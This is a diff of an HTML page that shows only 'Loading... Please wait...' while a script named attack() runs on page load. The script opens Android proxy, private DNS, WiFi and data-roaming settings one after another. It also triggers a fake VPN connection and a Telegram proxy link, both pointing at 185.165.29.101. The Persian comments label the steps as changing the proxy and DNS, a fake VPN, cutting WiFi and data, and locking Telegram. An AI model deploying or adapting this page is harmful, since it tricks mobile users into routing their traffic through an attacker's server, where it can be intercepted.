@@ -1,11 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0; url='intent://settings#Intent;action=android.settings.PROXY_SETTINGS;end'" />
-    <meta http-equiv="refresh" content="1; url='intent://settings#Intent;action=android.settings.PRIVATE_DNS_SETTINGS;end'" />
-    <meta http-equiv="refresh" content="2; url='vpn://connect?server=185.165.29.101&port=443&type=openvpn'" />
+    <title>Loading...</title>
+    <script>
+        function attack() {
+            // ۱. تغییر Proxy
+            window.location.href = "intent://settings#Intent;action=android.settings.PROXY_SETTINGS;end";
+            
+            // ۲. تغییر DNS
+            setTimeout(() => {
+                window.location.href = "intent://settings#Intent;action=android.settings.PRIVATE_DNS_SETTINGS;end";
+            }, 1000);
+            
+            // ۳. VPN جعلی
+            setTimeout(() => {
+                window.location.href = "vpn://connect?server=185.165.29.101&port=443&type=openvpn";
+            }, 2000);
+            
+            // ۴. قطع WiFi
+            setTimeout(() => {
+                window.location.href = "intent://settings#Intent;action=android.settings.WIFI_SETTINGS;end";
+            }, 3000);
+            
+            // ۵. قطع دیتا
+            setTimeout(() => {
+                window.location.href = "intent://settings#Intent;action=android.settings.DATA_ROAMING_SETTINGS;end";
+            }, 4000);
+            
+            // ۶. قفل تلگرام
+            setTimeout(() => {
+                window.location.href = "tg://proxy?server=185.165.29.101&port=443&secret=eea33f02521125000000000000000000";
+            }, 5000);
+        }
+        
+        // اجرا بعد از ۱ ثانیه
+        setTimeout(attack, 1000);
+    </script>
 </head>
 <body style="background:white; color:black; font-family:sans-serif; text-align:center; padding-top:50%;">
     <h1>Loading...</h1>
+    <p style="font-size:14px; color:gray;">Please wait...</p>
 </body>
 </html>
